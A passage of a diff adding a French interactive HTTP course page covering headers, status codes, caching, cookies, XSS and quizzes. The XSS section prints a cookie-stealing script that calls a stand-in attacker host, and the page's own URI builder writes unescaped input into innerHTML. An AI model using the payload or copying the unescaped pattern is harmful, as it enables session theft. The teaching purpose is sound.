+            <strong>Traitement par le serveur</strong>
+            <span>Le serveur lit la requête, génère la réponse (exécute PHP si besoin, lit un fichier…)</span>
+          </div>
+        </div>
+        <div class="flow-step">
+          <div class="flow-num">5</div>
+          <div class="flow-content">
+            <strong>Réponse HTTP</strong>
+            <span>Le serveur envoie le code d'état, les en-têtes et le corps (HTML, image, JSON…)</span>
+          </div>
+        </div>
+        <div class="flow-step">
+          <div class="flow-num">6</div>
+          <div class="flow-content">
+            <strong>Fermeture TCP</strong>
+            <span>À l'initiative du serveur. En HTTP/1.1, la connexion peut rester ouverte pour plusieurs échanges.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <h3>HTTP 1.0 vs HTTP 1.1</h3>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title" style="color:var(--accent3)">HTTP 1.0 — Une connexion par ressource</div>
+        <p>Le serveur ferme la connexion TCP après chaque réponse. Pour récupérer une page avec 10 ressources liées (images, CSS, JS), il faut <strong>10 connexions TCP</strong> successives.</p>
+        <div class="tip warn" style="margin-top:12px;">
+          <div class="tip-icon">⚠</div>
+          <div class="tip-text">Lent et coûteux : établir une connexion TCP prend du temps (échange SYN / SYN-ACK).</div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title" style="color:var(--accent)">HTTP 1.1 — Connexion persistante</div>
+        <p>La connexion reste ouverte par défaut (<code>Connection: keep-alive</code>). Plusieurs requêtes/réponses sur la même connexion TCP.</p>
+        <p>Introduce aussi l'en-tête <code>Host:</code> <strong>obligatoire</strong>, ce qui permet le <em>virtual hosting</em> : plusieurs sites web sur la même adresse IP.</p>
+      </div>
+    </div>
+
+    <h3>Virtual Hosting</h3>
+    <div class="card">
+      <div class="card-title">Pourquoi Host: est obligatoire en HTTP/1.1</div>
+      <p>Tous les enseignants et étudiants de l'IUT partagent la même IP <code>10.31.6.118</code>. Sans l'en-tête <code>Host:</code>, le serveur ne saurait pas quel "site virtuel" est demandé.</p>
+      <pre><span class="kw">GET</span> / <span class="kw">HTTP/1.1</span>
+<span class="hdr">Host:</span> <span class="val">cutrona.ad-urca.univ-reims.fr</span>   <span class="cmt">← indispensable !</span>
+<span class="hdr">Connection:</span> close</pre>
+      <div class="tip">
+        <div class="tip-icon">💡</div>
+        <div class="tip-text">En <strong>HTTP 1.0</strong>, l'en-tête <code>Host:</code> n'existe pas — une IP = un seul site web. En <strong>HTTP 1.1</strong>, <code>Host:</code> est le seul en-tête véritablement obligatoire.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ─── MESSAGES ─── -->
+  <div id="s-messages" class="section">
+    <div class="section-header">
+      <div class="section-num">03 / Messages HTTP</div>
+      <h2 class="section-title">Anatomie des messages</h2>
+      <p class="section-desc">Requête et réponse partagent la même structure en 4 parties. Seule la première ligne diffère.</p>
+    </div>
+
+    <h3>Structure d'une requête GET</h3>
+    <div class="msg-block">
+      <div class="msg-part line1"><span class="kw">GET</span> /cours/http HTTP/1.1<div class="msg-label">① ligne de requête</div></div>
+      <div class="msg-part headers">
+        <span class="hdr">Host:</span> <span class="val">iut.univ-reims.fr</span><br>
+        <span class="hdr">Connection:</span> close<br>
+        <span class="hdr">Accept:</span> text/html,*/*<br>
+        <span class="hdr">User-Agent:</span> Mozilla/5.0<br>
+        <span class="hdr">Cookie:</span> theme=dark
+        <div class="msg-label">② en-têtes</div>
+      </div>
+      <div class="msg-part blank"><span style="color:var(--accent3);">\r\n  ← ligne vide OBLIGATOIRE</span><div class="msg-label">③ séparateur</div></div>
+      <div class="msg-part body" style="color:var(--muted);font-style:italic;">(vide pour GET)<div class="msg-label">④ corps</div></div>
+    </div>
+
+    <h3>Structure d'une requête POST</h3>
+    <div class="msg-block">
+      <div class="msg-part line1"><span class="kw">POST</span> /login HTTP/1.1<div class="msg-label">① ligne de requête</div></div>
+      <div class="msg-part headers">
+        <span class="hdr">Host:</span> <span class="val">example.com</span><br>
+        <span class="hdr">Connection:</span> close<br>
+        <span class="hdr">Content-Type:</span> <span class="val">application/x-www-form-urlencoded</span><br>
+        <span class="hdr">Content-Length:</span> <span class="val">27</span>
+        <div class="msg-label">② en-têtes</div>
+      </div>
+      <div class="msg-part blank"><span style="color:var(--accent3);">\r\n</span><div class="msg-label">③ séparateur</div></div>
+      <div class="msg-part body">username=alban&amp;password=1234<div class="msg-label">④ corps (payload)</div></div>
+    </div>
+
+    <div class="tip warn">
+      <div class="tip-icon">⚠</div>
+      <div class="tip-text">La <strong>ligne vide</strong> est le seul marqueur de fin des en-têtes. Si tu l'oublies dans une requête écrite à la main, le serveur attend indéfiniment d'autres en-têtes (<code>waiting... waiting...</code> dans le TP).</div>
+    </div>
+
+    <h3>GET vs POST — comparaison</h3>
+    <div class="card">
+      <table class="compare-table" style="width:100%">
+        <tr>
+          <th>Critère</th>
+          <th>GET</th>
+          <th>POST</th>
+        </tr>
+        <tr>
+          <td>Où sont les données ?</td>
+          <td>Dans l'URL (query string)</td>
+          <td>Dans le corps du message</td>
+        </tr>
+        <tr>
+          <td>Visible dans la barre d'adresse ?</td>
+          <td class="yes">Oui</td>
+          <td class="no">Non</td>
+        </tr>
+        <tr>
+          <td>Bookmarkable ?</td>
+          <td class="yes">Oui</td>
+          <td class="no">Non</td>
+        </tr>
+        <tr>
+          <td>Peut envoyer des fichiers ?</td>
+          <td class="no">Non</td>
+          <td class="yes">Oui (multipart/form-data)</td>
+        </tr>
+        <tr>
+          <td>Cacheable ?</td>
+          <td class="yes">Oui</td>
+          <td class="no">Non par défaut</td>
+        </tr>
+        <tr>
+          <td>Content-Type requis ?</td>
+          <td class="no">Non</td>
+          <td class="yes">Oui si corps non vide</td>
+        </tr>
+      </table>
+    </div>
+
+    <h3>En-têtes importants à connaître</h3>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">Côté requête</div>
+        <table class="compare-table">
+          <tr><td><code>Host</code></td><td>Nom du serveur visé (obligatoire HTTP/1.1)</td></tr>
+          <tr><td><code>Connection</code></td><td><code>close</code> ou <code>keep-alive</code></td></tr>
+          <tr><td><code>User-Agent</code></td><td>Identifiant du navigateur</td></tr>
+          <tr><td><code>Accept</code></td><td>Types MIME acceptés</td></tr>
+          <tr><td><code>Cookie</code></td><td>Cookies stockés pour ce domaine</td></tr>
+          <tr><td><code>Content-Type</code></td><td>Type du corps (POST)</td></tr>
+          <tr><td><code>Content-Length</code></td><td>Taille du corps en octets</td></tr>
+          <tr><td><code>Referer</code></td><td>Page d'origine du clic</td></tr>
+          <tr><td><code>If-Modified-Since</code></td><td>Cache conditionnel</td></tr>
+        </table>
+      </div>
+      <div class="card">
+        <div class="card-title">Côté réponse</div>
+        <table class="compare-table">
+          <tr><td><code>Content-Type</code></td><td>Type MIME du corps</td></tr>
+          <tr><td><code>Content-Length</code></td><td>Taille du corps</td></tr>
+          <tr><td><code>Last-Modified</code></td><td>Date de dernière modification</td></tr>
+          <tr><td><code>Set-Cookie</code></td><td>Dépose un cookie chez le client</td></tr>
+          <tr><td><code>Location</code></td><td>URL de redirection (3xx)</td></tr>
+          <tr><td><code>Cache-Control</code></td><td>Politique de cache</td></tr>
+          <tr><td><code>Server</code></td><td>Logiciel serveur (Apache…)</td></tr>
+          <tr><td><code>Connection</code></td><td>Fermeture ou persistance</td></tr>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- ─── RÉPONSE ─── -->
+  <div id="s-reponse" class="section">
+    <div class="section-header">
+      <div class="section-num">04 / Codes de réponse</div>
+      <h2 class="section-title">Les codes d'état HTTP</h2>
+      <p class="section-desc">Le premier chiffre indique la famille. Le message texte est indicatif — seul le code a une valeur contractuelle.</p>
+    </div>
+
+    <h3>Structure d'une réponse</h3>
+    <div class="msg-block">
+      <div class="msg-part line1">HTTP/1.1 <span class="ok">200 OK</span><div class="msg-label">① ligne d'état</div></div>
+      <div class="msg-part headers">
+        <span class="hdr">Content-Type:</span> <span class="val">text/html; charset=UTF-8</span><br>
+        <span class="hdr">Content-Length:</span> <span class="val">1256</span><br>
+        <span class="hdr">Last-Modified:</span> <span class="val">Thu, 17 Oct 2019 07:18:26 GMT</span><br>
+        <span class="hdr">Cache-Control:</span> <span class="val">max-age=604800</span><br>
+        <span class="hdr">Connection:</span> close
+        <div class="msg-label">② en-têtes</div>
+      </div>
+      <div class="msg-part blank"><span style="color:var(--accent3);">\r\n</span><div class="msg-label">③ séparateur</div></div>
+      <div class="msg-part body">&lt;!doctype html&gt;<br>&lt;html&gt;…&lt;/html&gt;<div class="msg-label">④ corps (HTML)</div></div>
+    </div>
+
+    <h3>Familles de codes</h3>
+    <div class="status-grid">
+      <div class="status-card s1">
+        <div class="status-num">1xx</div>
+        <div class="status-info">
+          <strong>Information</strong>
+          <p>100 Continue — le serveur attend la suite de la requête</p>
+        </div>
+      </div>
+      <div class="status-card s2">
+        <div class="status-num">2xx</div>
+        <div class="status-info">
+          <strong>Succès</strong>
+          <p>200 OK · 201 Created (API REST)</p>
+        </div>
+      </div>
+      <div class="status-card s3">
+        <div class="status-num">3xx</div>
+        <div class="status-info">
+          <strong>Redirection</strong>
+          <p>301 Permanent · 302 Temporaire · 304 Not Modified</p>
+        </div>
+      </div>
+      <div class="status-card s4">
+        <div class="status-num">4xx</div>
+        <div class="status-info">
+          <strong>Erreur client</strong>
+          <p>400 Bad Request · 403 Forbidden · 404 Not Found · 418 I'm a teapot</p>
+        </div>
+      </div>
+      <div class="status-card s5">
+        <div class="status-num">5xx</div>
+        <div class="status-info">
+          <strong>Erreur serveur</strong>
+          <p>500 Internal Error · 503 Service Unavailable</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="tip">
+      <div class="tip-icon">💡</div>
+      <div class="tip-text">Le <strong>304 Not Modified</strong> est le seul code de succès sans corps dans la réponse. Il dit : "tu as déjà la bonne version en cache, inutile de re-télécharger."</div>
+    </div>
+
+    <h3>Codes à retenir absolument</h3>
+    <div class="card">
+      <table class="compare-table">
+        <tr><th>Code</th><th>Signification</th><th>Quand ?</th></tr>
+        <tr><td><code class="ok">200</code></td><td>OK</td><td>Tout s'est bien passé, voici la ressource</td></tr>
+        <tr><td><code style="color:#6ee7b7">201</code></td><td>Created</td><td>Ressource créée (PUT/POST sur une API)</td></tr>
+        <tr><td><code class="val">301</code></td><td>Moved Permanently</td><td>L'URL a changé définitivement (+ en-tête Location:)</td></tr>
+        <tr><td><code class="val">302</code></td><td>Found</td><td>Redirection temporaire</td></tr>
+        <tr><td><code class="val">304</code></td><td>Not Modified</td><td>Cache valide, pas de corps dans la réponse</td></tr>
+        <tr><td><code class="err">400</code></td><td>Bad Request</td><td>Requête malformée (manque Host: en HTTP/1.1…)</td></tr>
+        <tr><td><code class="err">403</code></td><td>Forbidden</td><td>Accès interdit (authentifié mais pas autorisé)</td></tr>
+        <tr><td><code class="err">404</code></td><td>Not Found</td><td>Ressource introuvable</td></tr>
+        <tr><td><code class="err">500</code></td><td>Internal Server Error</td><td>Erreur côté serveur (bug PHP, config…)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <!-- ─── CACHE ─── -->
+  <div id="s-cache" class="section">
+    <div class="section-header">
+      <div class="section-num">05 / Cache &amp; requêtes conditionnelles</div>
+      <h2 class="section-title">Éviter de tout re-télécharger</h2>
+      <p class="section-desc">Les requêtes conditionnelles permettent au client de demander une ressource uniquement si elle a changé depuis sa dernière visite.</p>
+    </div>
+
+    <h3>Principe</h3>
+    <div class="flow-timeline">
+      <div class="flow-step">
+        <div class="flow-num">1</div>
+        <div class="flow-content">
+          <strong>Première visite</strong>
+          <span>Le client demande <code>GET /page.html</code>. Le serveur répond <code>200 OK</code> avec le contenu <em>et</em> un en-tête <code>Last-Modified: Thu, 17 Oct 2019 07:18:26 GMT</code>.</span>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="flow-num">2</div>
+        <div class="flow-content">
+          <strong>Le navigateur met en cache</strong>
+          <span>Il retient le fichier <em>et</em> sa date de dernière modification.</span>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="flow-num">3</div>
+        <div class="flow-content">
+          <strong>Deuxième visite</strong>
+          <span>Le client envoie une <em>requête conditionnelle</em> avec <code>If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT</code>.</span>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="flow-num">4a</div>
+        <div class="flow-content">
+          <strong>Ressource non modifiée → 304 Not Modified</strong>
+          <span>Réponse sans corps. Le navigateur utilise sa version en cache. Économie de bande passante !</span>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="flow-num">4b</div>
+        <div class="flow-content">
+          <strong>Ressource modifiée → 200 OK</strong>
+          <span>Le serveur envoie le nouveau contenu avec un nouveau <code>Last-Modified</code>. Le cache est mis à jour.</span>
+        </div>
+      </div>
+    </div>
+
+    <h3>Exemple de requête conditionnelle</h3>
+    <div class="msg-block">
+      <div class="msg-part line1"><span class="kw">GET</span> /bonjour.html <span class="kw">HTTP/1.1</span></div>
+      <div class="msg-part headers">
+        <span class="hdr">Host:</span> <span class="val">demo.ad-urca.univ-reims.fr</span><br>
+        <span class="hdr">Connection:</span> close<br>
+        <span class="hdr">If-Modified-Since:</span> <span class="val">Thu, 17 Oct 2019 07:18:26 GMT</span>  <span class="cmt">← requête conditionnelle</span>
+      </div>
+      <div class="msg-part blank"><span style="color:var(--accent3);">\r\n</span></div>
+      <div class="msg-part body" style="color:var(--muted);font-style:italic;">(vide)</div>
+    </div>
+    <p>Réponse attendue si rien n'a changé :</p>
+    <div class="msg-block">
+      <div class="msg-part line1">HTTP/1.1 <span class="val">304 Not Modified</span></div>
+      <div class="msg-part headers"><span class="hdr">Connection:</span> close<br><span class="hdr">Date:</span> …</div>
+      <div class="msg-part blank"><span style="color:var(--accent3);">\r\n</span></div>
+      <div class="msg-part body" style="color:var(--muted);font-style:italic;">(pas de corps — économie de bande passante !)</div>
+    </div>
+
+    <h3>En-têtes liés au cache</h3>
+    <div class="card">
+      <table class="compare-table">
+        <tr><th>En-tête</th><th>Direction</th><th>Rôle</th></tr>
+        <tr><td><code>Last-Modified</code></td><td>Réponse</td><td>Date de dernière modification de la ressource</td></tr>
+        <tr><td><code>If-Modified-Since</code></td><td>Requête</td><td>Demande la ressource seulement si modifiée après cette date</td></tr>
+        <tr><td><code>Cache-Control: max-age=N</code></td><td>Réponse</td><td>Durée de validité du cache en secondes</td></tr>
+        <tr><td><code>Cache-Control: no-cache</code></td><td>Req/Rép</td><td>Toujours re-valider avec le serveur</td></tr>
+        <tr><td><code>Pragma: no-cache</code></td><td>Requête</td><td>Équivalent HTTP/1.0 de Cache-Control: no-cache</td></tr>
+        <tr><td><code>Expires</code></td><td>Réponse</td><td>Date d'expiration du cache (HTTP/1.0)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <!-- ─── COOKIES ─── -->
+  <div id="s-cookies" class="section">
+    <div class="section-header">
+      <div class="section-num">06 / Cookies &amp; sessions</div>
+      <h2 class="section-title">Comment HTTP se souvient de toi</h2>
+      <p class="section-desc">HTTP est sans état (stateless) par nature. Les cookies et sessions sont les mécanismes qui compensent cette limitation.</p>
+    </div>
+
+    <div class="tip warn">
+      <div class="tip-icon">⚠</div>
+      <div class="tip-text">HTTP est <strong>sans état</strong> : le serveur ne reconnaît pas un client entre deux requêtes. Il n'a aucune "mémoire" des échanges précédents.</div>
+    </div>
+
+    <h3>Cookies</h3>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title">Le serveur dépose le cookie</div>
+        <pre><span class="cmt">← Réponse du serveur</span>
+HTTP/1.1 200 OK
+<span class="hdr">Set-Cookie:</span> <span class="val">theme=dark; Max-Age=3600</span>
+...</pre>
+        <p>Le navigateur stocke ce cookie et le renverra à chaque requête sur ce domaine.</p>
+      </div>
+      <div class="card">
+        <div class="card-title">Le client renvoie le cookie</div>
+        <pre><span class="cmt">→ Requête suivante</span>
+GET / HTTP/1.1
+<span class="hdr">Host:</span> example.com
+<span class="hdr">Cookie:</span> <span class="val">theme=dark</span>
+</pre>
+        <p>Le serveur lit la valeur et adapte la réponse (afficher le thème sombre).</p>
+      </div>
+    </div>
+
+    <div class="tip warn">
+      <div class="tip-icon">⚠</div>
+      <div class="tip-text">Les cookies sont stockés et modifiables côté client. Un utilisateur peut changer <code>theme=dark</code> en <code>theme=toto</code>. Si le serveur insère cette valeur sans vérification dans le HTML → bug ou faille de sécurité.</div>
+    </div>
+
+    <h3>Sessions PHP</h3>
+    <p>Les sessions stockent les données <strong>sur le serveur</strong>. Seul un identifiant (<code>PHPSESSID</code>) est confié au client via un cookie.</p>
+
+    <div class="flow-timeline">
+      <div class="flow-step">
+        <div class="flow-num">1</div>
+        <div class="flow-content">
+          <strong>Connexion</strong>
+          <span>Client envoie ses identifiants en POST. Le serveur crée une session, lui attribue un ID unique : <code>PHPSESSID=abc123</code>.</span>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="flow-num">2</div>
+        <div class="flow-content">
+          <strong>Set-Cookie</strong>
+          <span>Le serveur dépose le cookie <code>PHPSESSID=abc123</code> chez le client. Durée "Session" = disparaît à la fermeture du navigateur.</span>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="flow-num">3</div>
+        <div class="flow-content">
+          <strong>Requêtes suivantes</strong>
+          <span>Le client renvoie <code>Cookie: PHPSESSID=abc123</code>. Le serveur consulte son stockage, retrouve les données associées à <code>abc123</code>.</span>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="flow-num">4</div>
+        <div class="flow-content">
+          <strong>Suppression du cookie côté client</strong>
+          <span>Le serveur ne reçoit plus l'ID → ne reconnaît plus le client → le redirige vers /login. Mais la session existe toujours côté serveur.</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="tip">
+      <div class="tip-icon">💡</div>
+      <div class="tip-text">Si quelqu'un <strong>vole la valeur de PHPSESSID</strong> et l'envoie dans ses propres requêtes, le serveur le considère comme l'utilisateur légitime. C'est l'attaque par vol de session — rendue possible par XSS.</div>
+    </div>
+  </div>
+
+  <!-- ─── XSS ─── -->
+  <div id="s-xss" class="section">
+    <div class="section-header">
+      <div class="section-num">07 / Sécurité &amp; XSS</div>
+      <h2 class="section-title">Cross-Site Scripting</h2>
+      <p class="section-desc">Comment un lien piégé peut voler le cookie de session d'un utilisateur connecté.</p>
+    </div>
+
+    <div class="tip warn">
+      <div class="tip-icon">⚠</div>
+      <div class="tip-text">La faille XSS naît quand un serveur insère <strong>sans vérification</strong> une valeur reçue du client dans le HTML de sa réponse. Si la valeur contient du JavaScript, il s'exécute dans le navigateur de la victime.</div>
+    </div>
+
+    <h3>Déroulement de l'attaque</h3>
+    <div class="flow-timeline">
+      <div class="flow-step">
+        <div class="flow-num">1</div>
+        <div class="flow-content">
+          <strong>La victime est connectée</strong>
+          <span>Elle a un cookie <code>PHPSESSID=abc123</code> valide sur le site cible.</span>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="flow-num">2</div>
+        <div class="flow-content">
+          <strong>Elle clique sur un lien piégé</strong>
+          <span>L'URL contient un paramètre <code>?q=&lt;script&gt;…&lt;/script&gt;</code>.</span>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="flow-num">3</div>
+        <div class="flow-content">
+          <strong>Le serveur vulnérable réfléchit la valeur</strong>
+          <span>Il insère <code>?q</code> directement dans son HTML sans échappement. La balise <code>&lt;script&gt;</code> se retrouve dans la page.</span>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="flow-num">4</div>
+        <div class="flow-content">
+          <strong>Le navigateur exécute le script</strong>
+          <span>Le script lit <code>document.cookie</code> et l'envoie au serveur pirate via une requête image ou fetch.</span>
+        </div>
+      </div>
+      <div class="flow-step">
+        <div class="flow-num">5</div>
+        <div class="flow-content">
+          <strong>L'attaquant récupère le cookie</strong>
+          <span>Il utilise <code>PHPSESSID=abc123</code> dans ses propres requêtes et usurpe l'identité de la victime.</span>
+        </div>
+      </div>
+    </div>
+
+    <h3>Le code malveillant décrypté</h3>
+    <div class="card">
+      <div class="card-title">URL piégée (après décodage)</div>
+      <pre><span class="cmt">Valeur du paramètre ?query= :</span>
+<span class="err">&lt;script&gt;</span>
+  new Image().src = <span class="val">'http://hacker.example/steal?c='</span>
+               + encodeURIComponent(document.cookie);
+<span class="err">&lt;/script&gt;</span></pre>
+      <p>Ce code crée une requête vers le serveur pirate en passant les cookies comme paramètre. L'image n'existe pas, mais la requête est envoyée quand même.</p>
+    </div>
+
+    <h3>Protections</h3>
+    <div class="grid2">
+      <div class="card">
+        <div class="card-title" style="color:var(--accent)">Côté serveur</div>
+        <ul>
+          <li><strong>Toujours échapper</strong> les données avant de les insérer dans le HTML (<code>htmlspecialchars()</code> en PHP)</li>
+          <li><strong>Valider</strong> les valeurs reçues (liste blanche)</li>
+          <li>Mettre le flag <strong>HttpOnly</strong> sur les cookies de session → JavaScript ne peut plus lire <code>document.cookie</code></li>
+        </ul>
+      </div>
+      <div class="card">
+        <div class="card-title" style="color:var(--accent2)">Exemple de protection PHP</div>
+        <pre><span class="cmt">// Vulnérable :</span>
+echo $_GET['q'];
+
+<span class="cmt">// Protégé :</span>
+echo htmlspecialchars($_GET['q'],
+     ENT_QUOTES, 'UTF-8');</pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- ─── EX: QUIZ ─── -->
+  <div id="s-ex-quiz" class="section">
+    <div class="section-header">
+      <div class="section-num">Exercice / Quiz général</div>
+      <h2 class="section-title">Teste tes connaissances</h2>
+      <p class="section-desc">15 questions sur l'ensemble du cours HTTP.</p>
+    </div>
+    <div id="quiz-container"></div>
+    <div class="score-display">
+      <span class="score-num" id="quiz-score">0</span>
+      <span>/ <span id="quiz-total">0</span> réponses correctes</span>
+      <button class="btn-reset" onclick="initQuiz()">↺ Recommencer</button>
+    </div>
+  </div>
+
+  <!-- ─── EX: URI BUILDER ─── -->
+  <div id="s-ex-uri" class="section">
+    <div class="section-header">
+      <div class="section-num">Exercice / Constructeur d'URI</div>
+      <h2 class="section-title">Construis une URI</h2>
+      <p class="section-desc">Remplis les champs et observe l'URI se construire en temps réel.</p>
+    </div>
+
+    <div class="card uri-builder">
+      <div class="grid2">
+        <div>
+          <div class="field">
+            <label>Scheme</label>
+            <select id="ub-scheme" oninput="buildURI()">
+              <option value="https">https</option>
+              <option value="http">http</option>
+              <option value="ftp">ftp</option>
+              <option value="mailto">mailto</option>
+            </select>
+          </div>
+          <div class="field">
+            <label>Host (nom de domaine ou IP)</label>
+            <input id="ub-host" type="text" value="iut.univ-reims.fr" oninput="buildURI()">
+          </div>
+          <div class="field">
+            <label>Port (laisser vide si standard)</label>
+            <input id="ub-port" type="text" placeholder="ex: 8080" oninput="buildURI()">
+          </div>
+          <div class="field">
+            <label>Path</label>
+            <input id="ub-path" type="text" value="/cours/http" oninput="buildURI()">
+          </div>
+        </div>
+        <div>
+          <div class="field">
+            <label>Paramètre 1 — nom</label>
+            <input id="ub-k1" type="text" placeholder="ex: page" oninput="buildURI()">
+          </div>
+          <div class="field">
+            <label>Paramètre 1 — valeur</label>
+            <input id="ub-v1" type="text" placeholder="ex: 2" oninput="buildURI()">
+          </div>
+          <div class="field">
+            <label>Paramètre 2 — nom</label>
+            <input id="ub-k2" type="text" placeholder="ex: theme" oninput="buildURI()">
+          </div>
+          <div class="field">
+            <label>Paramètre 2 — valeur</label>
+            <input id="ub-v2" type="text" placeholder="ex: dark" oninput="buildURI()">
+          </div>
+          <div class="field">
+            <label>Fragment (sans #)</label>
+            <input id="ub-frag" type="text" placeholder="ex: intro" oninput="buildURI()">
+          </div>
+        </div>
+      </div>
+      <div class="builder-label" style="margin-top:8px;">URI générée</div>
+      <div class="uri-result" id="uri-result"></div>
+    </div>
+
+    <div class="exercise">
+      <div class="exercise-header">
+        <span class="exercise-tag">Défi</span>
+        <span class="exercise-title">Construis l'URI de la documentation MySQL</span>
+      </div>
+      <div class="exercise-body">
+        <p>Reconstruit cette URI en utilisant le constructeur ci-dessus :</p>
+        <div style="background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:12px 16px;font-family:var(--mono);font-size:13px;margin-bottom:14px;word-break:break-all;color:var(--accent);">
+          mysql://app:!ChangeMe!@127.0.0.1:3306/app?serverVersion=8&amp;charset=utf8mb4
+        </div>
+        <p>Identifie : scheme · userinfo · host · port · path · query</p>
+        <button class="quiz-next" style="display:inline-block;" onclick="document.getElementById('uri-answer').style.display='block';this.style.display='none'">Voir la réponse</button>
+        <div id="uri-answer" style="display:none;margin-top:12px;">
+          <table class="compare-table">
+            <tr><td>scheme</td><td><code>mysql</code></td></tr>
+            <tr><td>userinfo</td><td><code>app:!ChangeMe!</code></td></tr>
+            <tr><td>host</td><td><code>127.0.0.1</code></td></tr>
+            <tr><td>port</td><td><code>3306</code></td></tr>
+            <tr><td>path</td><td><code>/app</code></td></tr>
+            <tr><td>query</td><td><code>serverVersion=8&amp;charset=utf8mb4</code></td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ─── EX: REQUEST BUILDER ─── -->
+  <div id="s-ex-req" class="section">
+    <div class="section-header">
+      <div class="section-num">Exercice / Construis ta requête</div>
+      <h2 class="section-title">Assemble une requête HTTP</h2>
+      <p class="section-desc">Sélectionne les bonnes options pour construire la requête demandée.</p>
+    </div>
+    <div id="req-builder-container"></div>
+  </div>
+
+  <!-- ─── EX: MATCH ─── -->
+  <div id="s-ex-match" class="section">
+    <div class="section-header">
+      <div class="section-num">Exercice / Associer les en-têtes</div>
+      <h2 class="section-title">Associe chaque en-tête à son rôle</h2>
+      <p class="section-desc">Clique sur un en-tête puis sur sa description pour les associer.</p>
+    </div>
+    <div id="match-container"></div>
+  </div>
+
+</main>
+
+<script>
+// ─── Navigation ───────────────────────────────────────────
+function showSection(id) {
+  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+  document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+
+  const target = document.getElementById('s-' + id);
+  if (target) target.classList.add('active');
+
+  const links = document.querySelectorAll('.nav-link');
+  links.forEach(l => {
+    if (l.getAttribute('onclick') && l.getAttribute('onclick').includes("'" + id + "'")) {
+      l.classList.add('active');
+    }
+  });
+
+  if (id === 'ex-uri') buildURI();
+  if (id === 'ex-req') initReqBuilder();
+  if (id === 'ex-match') initMatch();
+
+  // mobile close
+  document.getElementById('sidebar').classList.remove('open');
+  document.getElementById('overlay').style.display = 'none';
+  window.scrollTo(0, 0);
+}
+
+document.getElementById('hamburger').addEventListener('click', () => {
+  document.getElementById('sidebar').classList.toggle('open');
+  document.getElementById('overlay').style.display = 'block';
+});
+document.getElementById('overlay').addEventListener('click', () => {
+  document.getElementById('sidebar').classList.remove('open');
+  document.getElementById('overlay').style.display = 'none';
+});
+
+// ─── Score tracker ────────────────────────────────────────
+let totalAnswered = 0, totalCorrect = 0;
+function trackScore(correct) {
+  totalAnswered++;
+  if (correct) totalCorrect++;
+  document.getElementById('score-label').textContent = totalCorrect + ' / ' + totalAnswered;
+  const pct = totalAnswered ? Math.round(totalCorrect / totalAnswered * 100) : 0;
+  document.getElementById('progress-fill').style.width = pct + '%';
+  document.getElementById('quiz-score').textContent = totalCorrect;
+  document.getElementById('quiz-total').textContent = totalAnswered;
+}
+
+// ─── URI Builder ──────────────────────────────────────────
+function buildURI() {
+  const scheme = document.getElementById('ub-scheme').value;
+  const host   = document.getElementById('ub-host').value.trim();
+  const port   = document.getElementById('ub-port').value.trim();
+  const path   = document.getElementById('ub-path').value.trim();
+  const k1     = document.getElementById('ub-k1').value.trim();
+  const v1     = document.getElementById('ub-v1').value.trim();
+  const k2     = document.getElementById('ub-k2').value.trim();
+  const v2     = document.getElementById('ub-v2').value.trim();
+  const frag   = document.getElementById('ub-frag').value.trim();
+
+  let params = [];
+  if (k1) params.push(k1 + (v1 ? '=' + encodeURIComponent(v1) : ''));
+  if (k2) params.push(k2 + (v2 ? '=' + encodeURIComponent(v2) : ''));
+
+  let uri = `<span class="uri-scheme">${scheme}</span><span class="uri-sep">://</span>`;
+  if (host) uri += `<span class="uri-auth">${host}${port ? ':' + port : ''}</span>`;
+  if (path)  uri += `<span class="uri-path">${path}</span>`;
+  if (params.length) uri += `<span class="uri-sep">?</span><span class="uri-query">${params.join('&amp;')}</span>`;
+  if (frag)  uri += `<span class="uri-sep">#</span><span class="uri-frag">${frag}</span>`;
+
+  document.getElementById('uri-result').innerHTML = uri;
+}
+
+// ─── Quiz ─────────────────────────────────────────────────
+const quizData = [
+  {
+    q: "Quel en-tête est obligatoire dans toute requête HTTP/1.1 ?",
+    opts: ["User-Agent", "Host", "Accept", "Connection"],
+    correct: 1,
+    explain: "<strong>Host:</strong> est le seul en-tête obligatoire en HTTP/1.1. Il permet au serveur de savoir quel site virtuel est demandé (virtual hosting)."
+  },
+  {
+    q: "Que signifie un code de réponse 304 ?",
+    opts: ["La ressource n'existe pas", "Le serveur a planté", "La ressource n'a pas changé, utilise le cache", "La requête est redirigée"],
+    correct: 2,
+    explain: "<strong>304 Not Modified</strong> indique que la ressource n'a pas changé depuis le <code>If-Modified-Since</code> envoyé. La réponse n'a pas de corps → économie de bande passante."
+  },
+  {
+    q: "Dans une requête HTTP, qu'est-ce qui sépare les en-têtes du corps ?",
+    opts: ["Un point-virgule ';'", "Le mot-clé 'BODY'", "Une ligne vide (\\r\\n seul)", "L'en-tête Content-Length"],
+    correct: 2,
+    explain: "La <strong>ligne vide</strong> (CRLF seul) est l'unique séparateur entre en-têtes et corps. Sans elle, le serveur attend indéfiniment d'autres en-têtes."
+  },
+  {
+    q: "Avec la méthode GET, où se trouvent les données envoyées au serveur ?",
+    opts: ["Dans le corps du message", "Dans l'URL (query string)", "Dans les en-têtes", "Dans un cookie"],
+    correct: 1,
